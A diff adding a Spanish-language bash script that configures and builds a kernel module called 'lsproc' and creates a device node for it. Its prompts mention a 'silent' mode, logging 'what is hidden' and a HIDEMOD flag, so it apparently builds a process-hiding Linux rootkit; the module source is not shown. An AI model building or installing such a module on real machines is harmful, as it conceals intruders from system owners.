@@ -1,0 +1,22 @@
+#!/bin/bash
+echo "obj-m :=  lsproc.o" > Makefile
+echo "**************************************************"
+echo "> Ingresa el directorio de los fuentes del Kernel:" 
+echo -n "  $ "
+read kernel
+echo "> Ingresa el modo de ejecucion"
+echo "  != 1 	: 	El modulo se carga y se ejecuta de forma 'silenciosa'"
+echo "  1	:	El modulo se carga en modo DEBUG, se registra en /var/log/messages lo que se oculta"
+echo -n "  $ "
+read modo
+echo "#define MODO $modo" > config.h
+echo "> Indica un numero para el dispositivo :"
+echo -n "  $ "
+read num
+echo "#define DEV_NUM $num" >> config.h
+echo "> Ingrese nombre de Dispositivo a crear :"
+echo -n "  $ "
+read dev
+echo "#define HIDEMOD 0" >> config.h
+make -C $kernel SUBDIRS=$PWD modules
+mknod /dev/$dev c $num 0
